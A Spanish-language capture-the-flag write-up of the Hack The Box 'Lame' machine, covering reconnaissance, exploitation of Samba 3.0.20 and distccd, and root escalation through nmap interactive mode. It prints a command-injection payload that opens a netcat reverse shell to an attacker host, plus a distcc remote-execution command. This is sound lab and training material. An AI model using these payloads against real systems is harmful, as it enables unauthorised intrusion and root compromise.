---
title: Hack The Box - LAME - Linux - Samba 3.0.20 = CVE-2007-2447 - distccd v1 = CVE-2004-2687
date: 2020-07-17 22:59:00 Z
---

![LAME.jpg]({{site.baseurl}}/images/Lame/LAME.jpg)

El primer paso, será comprobar si disponemos de conectividad entre nuestra máquina y la máquina objetivo.
Podemos realizar un ping a la dirección de destino.

![ping.jpg]({{site.baseurl}}/images/Lame/ping.jpg)
w
Podemos comprobar como los paquetes llegan a la máquina de destino correctamente, además a través del comando ping, conocemos que se trata de una máquina Linux.

# Reconocimiento

En esta fase vamos a obtener más información de la máquina.
Usamos la herramienta **NMAP**
```
nmap -sC -sV 10.10.10.3 -p-
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|*End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|*  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|*clock-skew: mean: 2h06m36s, deviation: 2h49m45s, median: 6m34s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|*  System time: 2020-07-17T14:59:35-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

Vamos a obtener más información de los servicios samba.
NMAP cuenta con scripts, para realizar una enumeración de samba.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 15:15 EDT
Nmap scan report for 10.10.10.3
Host is up (0.10s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: <blank>
|   \\10.10.10.3\\ADMIN$:
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\\IPC$:
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: READ/WRITE
|   \\10.10.10.3\\opt:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\var\\lib\\samba\\printers
|     Anonymous access: <none>
|   \\10.10.10.3\\tmp:
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|_    Anonymous access: READ/WRITE
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```
Podemos intentar acceder con smbclient, a algunos de los directorios listamos con los scripts de Nmap.
Pero no vemos nada relevante.
Averiguado la versión de Samba 3.0.20, haremos uso de searchsploit para comprobar si está versión es vulnerable.
![searchsploit.jpg]({{site.baseurl}}/images/Lame/searchsploit.jpg)

Por último nos queda el puerto **distccd v1**, volvemos a usar la herramienta nmap, y sus buenos scripts.

![Nmap=distcc.jpg]({{site.baseurl}}/images/Lame/Nmap=distcc.jpg)

# Análisis

Descubrimos un **primer vector** en **Samba 3.0.20**, la vulnerabilidad **CVE2007-2447**

En la cuál podremos ejecutar una reverse shell hacía nuestro equipo.

Descubrimos un **segundo vector**, la vulnerabilidad **CVE-2004-2687**,está vulnerabilidad tiene una gravedad de rango **ALTO**, y nos permitiría ejecutar comandos de manera remota.

Podemos hacer uso de este código
`nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"`
O podemos hacer uso de este [script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855), es nuestro caso, será el que usemos.

# Explotación

**Atacando al primer vector**.
Primero, levantamos un puerto con netcat 

![ncsamba.jpg]({{site.baseurl}}/images/Lame/ncsamba.jpg)

Y por otra parte accedemos a los recursos de smb con smbclient

![smbclientsamba.jpg]({{site.baseurl}}/images/Lame/smbclientsamba.jpg)

Introducimos el siguiente comando
**logon “./=`nohup nc -e /bin/sh LHOST LPORT`”**
Una vez introducido el comando

![smbclient2.jpg]({{site.baseurl}}/images/Lame/smbclient2.jpg)

Se produce la conexión

![ncsamba2.jpg]({{site.baseurl}}/images/Lame/ncsamba2.jpg)

Conseguimos rápidamente root sin necesidad de una post-explotación.




**Atacando al segundo vector**
Si leemos el script, nos indica como explotarlo.
Primero, levantamos un puerto con netcat

![nc.jpg]({{site.baseurl}}/images/Lame/nc.jpg)

Y a posteriori, lanzamos el script

![pythonscript.jpg]({{site.baseurl}}/images/Lame/pythonscript.jpg)

Una vez lanzamos el script, obtendremos una shell.

![shell.jpg]({{site.baseurl}}/images/Lame/shell.jpg)

El objetivo de HTB, es conseguir las flags de el usuario y de root.
En este caso podríamos conseguir la del user.

![flaguser.jpg]({{site.baseurl}}/images/Lame/flaguser.jpg)

# POSTEXPLOTACIÓN

Una vez conseguido el acceso, debemos elevar nuestros privilegios para conseguir ser root, y conseguir la flag final.
Realizamos una búsqueda de **ficheros SUID, ficheros que podemos ejecutar con los permisos del usuario que los creo**.

![SUID.jpg]({{site.baseurl}}/images/Lame/SUID.jpg)

De todos los que nos encontramos, nos llama la atención la herramienta nmap, si..., parece que con está herramienta podemos realizar todo jeje.

![lsla.jpg]({{site.baseurl}}/images/Lame/lsla.jpg)

Las antiguas versiones de la herramienta nmap, cuentan con un **modo interactive**, el cuál permite a los usuarios ejecutar comandos en una shell.

![nmap-v.jpg]({{site.baseurl}}/images/Lame/nmap-v.jpg)

Este modo, está comprendido entre las versiones **2.02 a 5.21**
Abrimos el modo interactive e invocamos una shell

![nmap--interactive.jpg]({{site.baseurl}}/images/Lame/nmap--interactive.jpg)

Para más información sobre binarios, podemos hacer uso de [gtfobins ](https://gtfobins.github.io/gtfobins/nmap/)
Conseguimos root, y con ello tendremos permisos para obtener la flag

![flagroot.jpg]({{site.baseurl}}/images/Lame/flagroot.jpg)
